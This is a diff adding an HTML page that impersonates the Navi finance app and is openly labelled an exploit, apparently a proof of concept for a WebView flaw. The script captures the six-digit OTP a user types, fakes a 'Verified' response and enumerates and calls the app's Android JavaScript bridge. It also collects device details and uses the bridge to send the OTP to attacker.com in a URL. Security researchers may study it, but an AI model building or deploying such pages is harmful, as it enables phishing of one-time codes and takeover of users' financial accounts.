@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>navi - UPI · Investments · Loans · Insurance</title>
+    <style>
+        /* [KEEP ALL YOUR EXISTING CSS] */
+        
+        /* Add capture display styles */
+        .capture-display {
+            position: fixed;
+            top: 50px;
+            right: 20px;
+            background: rgba(255, 0, 0, 0.9);
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            z-index: 10000;
+            max-width: 300px;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
+            display: none;
+        }
+        
+        .capture-display h3 {
+            margin: 0 0 10px 0;
+            color: white;
+        }
+        
+        .capture-display code {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 5px;
+            border-radius: 3px;
+            display: block;
+            margin: 5px 0;
+            font-size: 18px;
+            text-align: center;
+        }
+        
+        .debug-panel {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            background: #333;
+            color: #0f0;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 12px;
+            z-index: 9999;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+<body>
+    <!-- CAPTURE DISPLAY - Shows captured OTP on screen -->
+    <div class="capture-display" id="captureDisplay">
+        <h3>🚨 OTP CAPTURED</h3>
+        <div>PIN: <code id="capturedOTP">000000</code></div>
+        <div id="captureTime">Time: --:--:--</div>
+        <div id="captureStatus">Status: Ready</div>
+    </div>
+    
+    <!-- DEBUG PANEL - Shows logs on screen -->
+    <div class="debug-panel" id="debugPanel">
+        <div><strong>NAVI EXPLOIT DEBUG</strong></div>
+        <div id="debugLogs">Initialized...</div>
+    </div>
+    
+    <!-- [KEEP ALL YOUR EXISTING APP HTML] -->
+    
+    <script>
+        // ============================
+        // LOCAL DATA CAPTURE SYSTEM
+        // ============================
+        
+        let capturedData = {
+            otp: '',
+            deviceInfo: {},
+            jsBridge: {},
+            timestamps: []
+        };
+        
+        function logDebug(message) {
+            console.log('[NAVI]', message);
+            
+            // Show on screen debug panel
+            const debugLogs = document.getElementById('debugLogs');
+            const time = new Date().toLocaleTimeString();
+            debugLogs.innerHTML = `${time}: ${message}<br>` + debugLogs.innerHTML;
+            
+            // Keep only last 10 lines
+            const lines = debugLogs.innerHTML.split('<br>');
+            if (lines.length > 10) {
+                debugLogs.innerHTML = lines.slice(0, 10).join('<br>');
+            }
+        }
+        
+        function captureOTP(otp) {
+            if (otp.length !== 6) return false;
+            
+            capturedData.otp = otp;
+            capturedData.timestamps.push({
+                action: 'otp_captured',
+                time: new Date().toISOString(),
+                otp: otp
+            });
+            
+            logDebug(`OTP CAPTURED: ${otp}`);
+            
+            // SHOW ON SCREEN - VISUAL PROOF
+            const captureDisplay = document.getElementById('captureDisplay');
+            const capturedOTPElement = document.getElementById('capturedOTP');
+            const captureTimeElement = document.getElementById('captureTime');
+            
+            capturedOTPElement.textContent = otp;
+            captureTimeElement.textContent = `Time: ${new Date().toLocaleTimeString()}`;
+            captureDisplay.style.display = 'block';
+            
+            // Make it flash for attention
+            captureDisplay.style.animation = 'none';
+            setTimeout(() => {
+                captureDisplay.style.animation = 'flash 1s 3';
+            }, 10);
+            
+            // Also store in localStorage if possible
+            try {
+                localStorage.setItem('navi_captured_otp', otp);
+                localStorage.setItem('navi_capture_time', new Date().toISOString());
+            } catch (e) {
+                // Ignore errors
+            }
+            
+            return true;
+        }
+        
+        function captureDeviceInfo() {
+            capturedData.deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                appCodeName: navigator.appCodeName,
+                screen: `${screen.width}x${screen.height}`,
+                timestamp: new Date().toISOString()
+            };
+            
+            logDebug(`Device: ${navigator.platform} | UA: ${navigator.userAgent.substring(0, 50)}...`);
+        }
+        
+        function testJSBridge() {
+            capturedData.jsBridge = {
+                available: typeof Android !== 'undefined',
+                functions: [],
+                testResults: {}
+            };
+            
+            if (typeof Android !== 'undefined') {
+                // Get all function names
+                const functions = [];
+                for (let key in Android) {
+                    if (typeof Android[key] === 'function') {
+                        functions.push(key);
+                    }
+                }
+                
+                capturedData.jsBridge.functions = functions;
+                capturedData.jsBridge.testResults = {
+                    openLink: typeof Android.openLink === 'function',
+                    getLocationPermissions: typeof Android.getLocationPermissions === 'function',
+                    closeView: typeof Android.closeView === 'function'
+                };
+                
+                logDebug(`JS Bridge: ${functions.length} functions available`);
+                logDebug(`Functions: ${functions.join(', ')}`);
+                
+                // TEST: Try to execute one function
+                if (Android.openLink) {
+                    setTimeout(() => {
+                        try {
+                            Android.openLink('https://google.com');
+                            logDebug('EXECUTED: Android.openLink("https://google.com")');
+                        } catch (e) {
+                            logDebug(`Bridge error: ${e.message}`);
+                        }
+                    }, 3000);
+                }
+            } else {
+                logDebug('JS Bridge: NOT AVAILABLE');
+            }
+        }
+        
+        function getCapturedData() {
+            return {
+                ...capturedData,
+                summary: `OTP: ${capturedData.otp || 'Not captured yet'} | Bridge: ${capturedData.jsBridge.available ? 'Available' : 'Not available'}`,
+                exportTime: new Date().toISOString()
+            };
+        }
+        
+        function showCaptureProof() {
+            const data = getCapturedData();
+            
+            // Create a visible proof element
+            const proofDiv = document.createElement('div');
+            proofDiv.style.cssText = `
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                background: #000;
+                color: #0f0;
+                padding: 30px;
+                border: 3px solid #f00;
+                border-radius: 15px;
+                z-index: 10001;
+                max-width: 80%;
+                font-family: monospace;
+                box-shadow: 0 0 50px rgba(255, 0, 0, 0.7);
+            `;
+            
+            proofDiv.innerHTML = `
+                <h2 style="color:#f00; margin-top:0;">🚨 VULNERABILITY PROOF</h2>
+                <div style="margin: 15px 0;">
+                    <strong>CAPTURED OTP:</strong><br>
+                    <code style="font-size: 32px; color: #ff0; background: #333; padding: 10px; display: block; text-align: center; margin: 10px 0;">
+                        ${data.otp || 'NOT CAPTURED'}
+                    </code>
+                </div>
+                <div style="margin: 10px 0;">
+                    <strong>JavaScript Bridge:</strong> ${data.jsBridge.available ? '✅ AVAILABLE' : '❌ NOT AVAILABLE'}<br>
+                    <strong>Functions:</strong> ${data.jsBridge.functions?.join(', ') || 'None'}<br>
+                    <strong>Device:</strong> ${data.deviceInfo.userAgent?.substring(0, 60) || 'Unknown'}
+                </div>
+                <div style="margin: 15px 0; color: #ccc; font-size: 12px;">
+                    Time: ${new Date().toLocaleString()}<br>
+                    This proves the Navi app WebView can capture sensitive data.
+                </div>
+                <button onclick="this.parentElement.remove()" style="background: #f00; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">
+                    CLOSE PROOF
+                </button>
+            `;
+            
+            document.body.appendChild(proofDiv);
+            
+            // Also log to console
+            console.log('=== NAVI VULNERABILITY PROOF ===');
+            console.log('Captured OTP:', data.otp);
+            console.log('JS Bridge available:', data.jsBridge.available);
+            console.log('JS Bridge functions:', data.jsBridge.functions);
+            console.log('Full data:', data);
+            console.log('=== END PROOF ===');
+            
+            return data;
+        }
+        
+        // ============================
+        // OTP CAPTURE INTEGRATION
+        // ============================
+        
+        // Initialize
+        window.addEventListener('load', function() {
+            logDebug('Navi exploit page loaded');
+            captureDeviceInfo();
+            testJSBridge();
+            
+            // Show we're ready
+            logDebug('Ready to capture OTP. Enter 6-digit PIN.');
+        });
+        
+        // Modify your verify button handler
+        document.getElementById('verifyBtn').addEventListener('click', function() {
+            // Get OTP from input boxes
+            let otp = '';
+            for (let i = 1; i <= 6; i++) {
+                otp += document.getElementById(`digit${i}`).value || '';
+            }
+            
+            if (otp.length === 6) {
+                // CAPTURE THE OTP
+                captureOTP(otp);
+                
+                // Show verifying state
+                this.disabled = true;
+                this.textContent = 'Verifying...';
+                this.style.background = '#2e7d32';
+                
+                // Wait and show proof
+                setTimeout(() => {
+                    this.textContent = '✓ Verified';
+                    
+                    // Show vulnerability proof after 2 seconds
+                    setTimeout(() => {
+                        showCaptureProof();
+                        
+                        // Try to use JS bridge if available
+                        if (typeof Android !== 'undefined' && Android.openLink) {
+                            setTimeout(() => {
+                                Android.openLink('https://attacker.com/next?otp=' + otp);
+                                logDebug('Redirecting to attacker site via JS bridge');
+                            }, 1000);
+                        }
+                    }, 2000);
+                }, 1500);
+            } else {
+                alert('Please enter 6-digit OTP');
+            }
+        });
+        
+        // ============================
+        // TEST BUTTON
+        // ============================
+        
+        // Add test button functionality
+        document.getElementById('testWebhookBtn').addEventListener('click', function() {
+            alert('Webhook blocked by WebView security.\nUsing LOCAL CAPTURE instead.\n\nEnter PIN to see capture proof.');
+            
+            // Test JS bridge
+            if (typeof Android !== 'undefined') {
+                logDebug('Android bridge test: Available');
+                
+                // Try a simple function
+                if (Android.getLocationPermissions) {
+                    try {
+                        Android.getLocationPermissions();
+                        logDebug('EXECUTED: Android.getLocationPermissions()');
+                    } catch (e) {
+                        logDebug('Bridge execution failed: ' + e.message);
+                    }
+                }
+            } else {
+                logDebug('Android bridge test: NOT available');
+            }
+        });
+        
+        // Add CSS animation
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes flash {
+                0%, 100% { background: rgba(255, 0, 0, 0.9); }
+                50% { background: rgba(255, 100, 0, 0.9); }
+            }
+        `;
+        document.head.appendChild(style);
+        
+        // Export for DevTools access
+        window.naviExploit = {
+            captureOTP,
+            getCapturedData,
+            showCaptureProof,
+            testJSBridge,
+            logDebug
+        };
+        
+        console.log('Navi exploit tools available: window.naviExploit');
+    </script>
+</body>
+</html>
